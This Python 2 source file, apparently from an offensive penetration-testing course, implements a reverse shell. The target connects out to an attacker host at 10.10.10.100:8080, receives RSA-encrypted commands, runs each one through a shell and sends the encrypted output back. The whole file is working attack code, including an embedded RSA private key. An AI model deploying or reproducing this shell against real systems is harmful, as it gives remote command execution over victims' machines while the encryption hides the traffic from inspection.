# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

import socket                    
import subprocess                 

from Crypto.PublicKey import RSA

def encrypt(message):
    #Remember that here we define the server's public key
    publickey ='''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAlkZ3S9jWwHcnBo5bVtL3
rr/pI0rsQQ+68uMgkxUy/79tLGoYK1V6QikMwdtMub3etya8/FfnbhMjkq5qwkfI
99C5lj+33uWf1VpOJ9zKWUbRzTAAikVsaP998jvIbRBIm5UK24+oAl6Y3D8/m/0z
I56udJUZlO5IRcdE1AmSCCzktF6gWD/o7RK3RBhG6VJXu9orf+ghdihR1zRsK7nR
RfoJDBqoOj+0JoHJEYPD4aMT1XGf2cVLwuQGakTH67GcTq5Y+/7oEsh1kJFThm7M
C+tg+R2352azYgZ2qNiuasGtFHnd4ikNRzYZm7CeOBCQ8/8YwPMZTolTkHe2Uuko
PK8SSj6D/Lg5Q+gqiDy1FvMWvAER2rxQYkRlTomkLvUU1iVVCmg3VViF8WGGgVoo
0AhxmsbJ4HM2NsAYZq+cfseVRNLL1MHHPENb9fO++bDJREoLBvme5Zxreq9JQ8p6
TlUNk4NVIQ8/Kq0G+Ja6G/mLakmTld0a+RTtGy9gIwDdcFLrbOeNbUyb0vkyK4OS
wUKb0OcurPoF7AGYs/E2zeWIxRDFXPaQ6JbUoih8kzhjen8sq0LN03oHLFy/2csH
jyZi0/2lVn1GRFrucHrdLdba+ZcCJ9B+JAw2aLOsnzGFPidLefkOTIRFFz/g5kVY
cmShcbYGnjhH3oM1khkomVkCAwEAAQ==
-----END PUBLIC KEY-----'''



    encryptor = RSA.importKey(publickey)
    global encriptedData
    encriptedData=encryptor.encrypt(message, 0)
    return encriptedData[0]

def decrypt(cipher):
    #Remember that here we define our (the target's) private key
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    
    decryptor = RSA.importKey(privatekey)
    dec = decryptor.decrypt(cipher)   
    return dec


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('10.10.10.100', 8080))                            
 
    while True:
        
        command =  decrypt(s.recv(512))
        print ' We received: ' +  command
        
        if 'terminate' in command:                 
            s.close()
            break 
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            if len(result)>512:
                for i in range(0, len(result), 512):
                    chunk = result[0+i:512+i]
                    s.send( encrypt (chunk ) )

            else:
                s.send( encrypt (result ) )
                

def main ():
    connect()
main()











